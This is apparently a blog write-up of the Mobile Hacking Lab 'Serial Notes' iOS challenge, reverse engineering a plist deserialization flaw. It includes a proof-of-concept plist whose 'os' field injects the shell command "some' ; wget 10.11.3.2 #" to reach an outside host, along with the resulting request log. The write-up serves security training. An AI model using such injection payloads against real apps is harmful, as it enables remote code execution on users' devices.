---
layout: post
title: Serial Notes - Mobile Hacking Lab
color: rgb(51,122,183)
tags: [Mobile Hacking lab, iOS Security]
comments: true
share: false
excerpt_separator: <!--more-->
---

The [Serial Notes](https://www.mobilehackinglab.com/course/lab-serial-notes) lab provides an opportunity to explore and gain insights into data deserialization processes within iOS applications, showcasing how vulnerabilities in these processes can potentially lead to Remote Code Execution (RCE). <!--more--> Let's delve into the steps leading up to achieving command execution (RCE) systematically.

### Introdução

When we first launch the Serial Notes application, we see a simple text editor for markdown files. The app offers functionalities like deleting notes, opening notes, and saving notes. Given the ability to save and open files, we start by investigating how these operations are handled behind the scenes.

### Static Analysis

Our first step is to examine the file saved by the application. Using the command:

```bash
file file notes.serial
```
We get the output:
```text
notes.serial: Apple binary property list
```

This indicates that the file is an Apple binary property list (plist). A binary plist is a serialized data format used by Apple to store complex data structures. To make this file more readable, we convert it to an XML format using the following command:

```bash
plistutil -i notes.serial -o notes.xml
```

The content is now human-readable:
```xml
<!--notes.xml-->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>$version</key>
	<integer>100000</integer>
	<key>$archiver</key>
	<string>NSKeyedArchiver</string>
	<key>$top</key>
	<dict>
		<key>root</key>
		<dict>
			<key>CF$UID</key>
			<integer>1</integer>
		</dict>
	</dict>
	<key>$objects</key>
	<array>
		<string>$null</string>
		<dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>2</integer>
				</dict>
			</array>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>8</integer>
			</dict>
		</dict>
		<dict>
			<key>last_updated</key>
			<dict>
				<key>CF$UID</key>
				<integer>5</integer>
			</dict>
			<key>content</key>
			<dict>
				<key>CF$UID</key>
				<integer>4</integer>
			</dict>
			<key>os</key>
			<dict>
				<key>CF$UID</key>
				<integer>6</integer>
			</dict>
			<key>name</key>
			<dict>
				<key>CF$UID</key>
				<integer>3</integer>
			</dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>7</integer>
			</dict>
		</dict>
		<string>Untitled</string>
		<string>Terry</string>
		<string>Wed, 12 Jun 2024 09:35:54 GMT</string>
		<string>Darwin serial-notes 21.6.0 Darwin Kernel Version 21.6.0: Sun Oct 15 00:18:06 PDT 2023; root:xnu-8020.241.42~8/RELEASE_ARM64_T8010 iPhone9,2 arm64 D11AP Darwin
</string>
		<dict>
			<key>$classname</key>
			<string>SerialNotes.Note</string>
			<key>$classes</key>
			<array>
				<string>SerialNotes.Note</string>
				<string>NSObject</string>
			</array>
		</dict>
		<dict>
			<key>$classname</key>
			<string>NSArray</string>
			<key>$classes</key>
			<array>
				<string>NSArray</string>
				<string>NSObject</string>
			</array>
		</dict>
	</array>
</dict>
</plist>
```

The file contains details about the note, such as `name`, `content`, `last_updated`, and `os`. Interestingly, the `os` field stores the output of the `uname -a` command.

### React Native

Next, we analyze the files extracted from the `.ipa` package and discover that the app uses React Native. We find a file named `main.jsbundle`, which contains the application's code. Running the file command on this file reveals:

```bash
file main.jsbundle 
main.jsbundle: Hermes JavaScript bytecode, version 96
```

Hermes is a JavaScript engine optimized for running React Native applications. We could use the [hermes-dec](https://github.com/P1sec/hermes-dec/) tool to disassemble the bytecode:

```bash
hbc-decompiler main.jsbundle reverse.js 
```

This generates a `.js` file, making it easier to analyze the application code. Despite our efforts, we don't find any immediate vulnerabilities. Therefore, we shift our focus to reverse-engineering the binary using Ghidra.

### Reverse Code Analysis

Upon opening the binary in Ghidra and conducting some analysis, we identify two interesting methods: `SerialNotes::SerialFile::$packFile` and `SerialNotes::SerialFile::$openFile`.

#### Analyzing  `SerialNotes::SerialFile::$openFile`

This method is responsible for creating the plist file, serializing the parameters `name`, `content`, `last_updated`, and `os`. The critical part of the method involves calling the `_executeCommand` function, which runs the `uname -a` command, storing its output in the `os` field of the Note object:

```c
SerialNotes::SerialFile::$packFile(SerialFile *this,String param_1,String filePath)

{
  ...
      uVar23 = puVar22[-2];
      uVar21 = *puVar22;
      uVar19 = puVar22[2];
      local_a8 = puVar22[5];
      local_a0 = iVar18;
      _swift_bridgeObjectRetain();
      _swift_bridgeObjectRetain_n(iVar25,2);
      _swift_bridgeObjectRetain_n(iVar20,2);
      _swift_bridgeObjectRetain_n(iVar24,2);
      pcVar7 = "uname -a";
      _executeCommand();
      _objc_retainAutoreleasedReturnValue();
      if (pcVar7 == (char *)0x0) {
                    /* WARNING: Does not return */
        pcVar4 = (code *)SoftwareBreakpoint(1,0x100006efc);
        (*pcVar4)();
      }
      SVar26 = (extension_Foundation)::Swift::String::$_unconditionallyBridgeFromObjectiveC();
      _objc_release(pcVar7);
      pNVar8 = Note::typeMetadataAccessor();
      pNVar9 = pNVar8;
      _objc_allocWithZone();
      puVar1 = (undefined8 *)(pNVar9 + _TtC11SerialNotes4Note::name);
      *puVar1 = uVar23;
      puVar1[1] = iVar25;
      puVar1 = (undefined8 *)(pNVar9 + _TtC11SerialNotes4Note::content);
      *puVar1 = uVar21;
      puVar1[1] = iVar20;
      puVar1 = (undefined8 *)(pNVar9 + _TtC11SerialNotes4Note::last_updated);
      *puVar1 = uVar19;
      puVar1[1] = iVar24;
      *(String *)(pNVar9 + _TtC11SerialNotes4Note::os) = SVar26;
      ppNVar10 = &local_90;
      local_b0 = iVar25;
      local_90 = pNVar9;
      pNStack_88 = pNVar8;
      _objc_msgSendSuper2(ppNVar10,"init");
      _Var12.unknown = local_98.unknown;
      _Var11.unknown = local_98.unknown;
      _swift_isUniquelyReferenced_nonNull_bridgeObject();
      if ((((sdword)_Var11.unknown == 0) || ((int)_Var12.unknown < 0)) ||
         (((uint)_Var12.unknown >> 0x3e & 1) != 0)) {
        if ((uint)_Var12.unknown >> 0x3e == 0) {
          iVar18 = *(int *)(((uint)_Var12.unknown & 0xfffffffffffff8) + 0x10);
        }
        else {
          _Var2.unknown = _Var12.unknown & 0xffffffffffffff8;
          if ((int)_Var12.unknown < 0) {
            _Var2.unknown = _Var12.unknown;
          }
          _swift_bridgeObjectRetain(_Var12.unknown);
          iVar18 = Swift::_CocoaArrayWrapper::get_endIndex(_Var2);
          _swift_bridgeObjectRelease(_Var12.unknown);
        }
        _Var12.unknown =
             (undefined *)Swift::_ArrayBuffer::_consumeAndCreateNew(false,iVar18 + 1,true,_Var12);
      }
      ...
      return SVar26;
}
```

#### Analyzing  `SerialNotes::SerialFile::$openFile`

The `SerialNotes::SerialFile::$openFile` method handles the deserialization of data. Initially, Ghidra's analysis didn't reveal much except a call to the `_executeCommand` function without clear input values. To get more insight, we opened the binary in Hopper.

In Hopper, the reverse of the method reveals more information, making it clearer. A notable section is:

```c
var_108 = "uname -a  | grep -o '" - 0x20 | 0x8000000000000000;
```

This line indicates that the method runs the `uname -a` command piped with `grep -o`, seemingly looking for a match. The command is then concatenated with an external input, which is alarming. It becomes apparent that the method fetches the `os` value from the deserialized file and executes it.

If the application does not sanitize this input properly, it presents a command injection vulnerability. An attacker could control the `os` variable in the file, altering it to something like `some' ; ourcommand` to execute arbitrary commands on the device.

```c
//SerialNotes::SerialFile::$openFile
int _$s11SerialNotes0A4FileC04openC0yS2SFTf4nd_n(int arg0, int arg1) {
    ...
loc_1000065f0:
    r27 = 0x0;
    var_F8 = r20 & 0xc000000000000001;
    r24 = *__swiftEmptyArrayStorage;
    var_108 = "uname -a  | grep -o '" - 0x20 | 0x8000000000000000;
    var_100 = 0xd000000000000015;
    var_F0 = r19;
    stack[-248] = r20;
    do {
            if (var_F8 != 0x0) {
                    r1 = r20;
                    r0 = generic specialization <SerialNotes.Note> of Swift._ArrayBuffer._getElementSlowPath(r27, r1);
            }
            else {
                    r0 = *(0x20 + r20 + r27 * 0x8);
                    r0 = [r0 retain];
            }
            r19 = r0;
            (*((**_swift_isaMask & *r0) + 0xb8))();
            stack[-200] = 0xe100000000000000;
            lazy protocol witness table accessor for type Swift.String and conformance Swift.String : Swift.StringProtocol in Swift();
            (extension in Foundation):Swift.StringProtocol.replacingOccurrences<A, B>(of:with:options:range:)();
            r22 = r29 - 0x98;
            swift_bridgeObjectRelease(r1);
            r0 = (*((*r23 & *r19) + 0x70))();
            var_D0 = r29 - 0x98;
            var_C8 = r0;
            r0 = (*((*r23 & *r19) + 0x88))();
            var_E0 = r29 - 0x98;
            var_D8 = r0;
            r28 = (*((*r23 & *r19) + 0xa0))();
            r23 = r29 - 0x98;
            Swift._StringGuts.grow();
            swift_bridgeObjectRelease(0xe000000000000000);
            Swift.String.append();
            Swift.String.append();
            r1 = var_108;
            Swift.String.utf8CString.getter();
            swift_bridgeObjectRelease(var_108);
            r0 = _executeCommand(r26 + 0x20);
            r29 = r29;
            r21 = [r0 retain];
            swift_release(r26);
            if (r21 != 0x0) {
                    r20 = static ();
                    r26 = r1;
                    [r21 release];
            }
            else {
                    r20 = 0x0;
                    r26 = 0x0;
            }
            r0 = swift_isUniquelyReferenced_nonNull_native(r24);
            if ((r0 & 0x1) == 0x0) {
                    r1 = *(r24 + 0x10) + 0x1;
                    r0 = generic specialization <SerialNotes.JsonNote> of Swift._ArrayBuffer._consumeAndCreateNew(0x0, r1, 0x1, r24);
                    r24 = r0;
            }
            r25 = *(int128_t *)(r24 + 0x10);
            r8 = *(int128_t *)(r24 + 0x18);
            r21 = r25 + 0x1;
            if (r25 >= r8 / 0x2) {
                    if (r8 > 0x1) {
                            if (CPU_FLAGS & A) {
                                    r0 = 0x1;
                            }
                    }
                    r1 = r21;
                    r24 = generic specialization <SerialNotes.JsonNote> of Swift._ArrayBuffer._consumeAndCreateNew(r0, r1, 0x1, r24);
            }
            r27 = r27 + 0x1;
            *(r24 + 0x10) = r21;
            *(int128_t *)(0x20 + r24 + r25 * 0x40) = var_C8;
            *(int128_t *)(0x28 + r24 + r25 * 0x40) = var_D0;
            *(int128_t *)(0x30 + r24 + r25 * 0x40) = var_D8;
            *(int128_t *)(0x38 + r24 + r25 * 0x40) = var_E0;
            *(int128_t *)(0x40 + r24 + r25 * 0x40) = r28;
            *(int128_t *)(0x48 + r24 + r25 * 0x40) = r23;
            *(int128_t *)(0x50 + r24 + r25 * 0x40) = r20;
            *(int128_t *)(0x58 + r24 + r25 * 0x40) = r26;
            [r19 release];
            swift_bridgeObjectRelease(r22);
            r20 = stack[-248];
    } while (var_F0 != r27);
    goto loc_1000068f4;

...
    goto loc_10000690c;
}
```

### Exploiting the Application

All that's left is to test our hypothesis and see if we can exploit this command injection vulnerability to achieve remote code execution. We'll modify the file generated when saving a note. Let's change the value from the output of the `uname -a` command to our payload: `some' ; wget 10.11.3.2 #`.

```xml
<!--poc.xml -->

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>$version</key>
    <integer>100000</integer>
    <key>$archiver</key>
    <string>NSKeyedArchiver</string>
    <key>$top</key>
    <dict>
        <key>root</key>
        <dict>
            <key>CF$UID</key>
            <integer>1</integer>
        </dict>
    </dict>
    <key>$objects</key>
    <array>
        <string>$null</string>
        <!-- NSArray -->
        <dict>
            <key>NS.objects</key>
            <array>
                <dict>
                    <key>CF$UID</key>
                    <integer>2</integer>
                </dict>
            </array>
            <key>$class</key>
            <dict>
                <key>CF$UID</key>
                <integer>8</integer>
            </dict>
        </dict>
        <!-- Note -->
        <dict>
            <key>last_updated</key>
            <dict>
                <key>CF$UID</key>
                <integer>5</integer>
            </dict>
            <key>content</key>
            <dict>
                <key>CF$UID</key>
                <integer>4</integer>
            </dict>
            <key>os</key>
            <dict>
                <key>CF$UID</key>
                <integer>6</integer>
            </dict>
            <key>name</key>
            <dict>
                <key>CF$UID</key>
                <integer>3</integer>
            </dict>
            <key>$class</key>
            <dict>
                <key>CF$UID</key>
                <integer>7</integer>
            </dict>
        </dict>
        <!-- Note Data -->
        <string>POC</string>
		    <string>Lets get RCE!</string>
		    <string>date</string>
        <string>some' ; wget 10.11.3.2 #</string>
        <!-- SerialNotes.Note Class Definition -->
        <dict>
            <key>$classname</key>
            <string>SerialNotes.Note</string>
            <key>$classes</key>
            <array>
                <string>SerialNotes.Note</string>
                <string>NSObject</string>
            </array>
        </dict>
        <!-- NSArray Class Definition -->
        <dict>
            <key>$classname</key>
            <string>NSArray</string>
            <key>$classes</key>
            <array>
                <string>NSArray</string>
                <string>NSObject</string>
            </array>
        </dict>
    </array>
</dict>
</plist>
```

Now, all that remains is to load this modified file into the application. If the application processes the file without proper sanitization, we should observe a request to our server, confirming the command injection and remote code execution vulnerability.

```text
10.11.0.1 - - [12/Jun/2024 15:27:40] "GET / HTTP/1.1" 200 -
```

Success, we get code execution!

### Conclusion 

This lab demonstrates the critical importance of sanitizing user-controlled data, especially when deserializing files. The absence of proper data sanitization can lead to severe vulnerabilities, such as command injection and remote code execution. For a hands-on experience with these concepts, visit the lab at [MobileHackingLab - Serial Notes](https://www.mobilehackinglab.com/course/lab-serial-notes). Embark on a journey of discovery and bolster your expertise in mobile security.






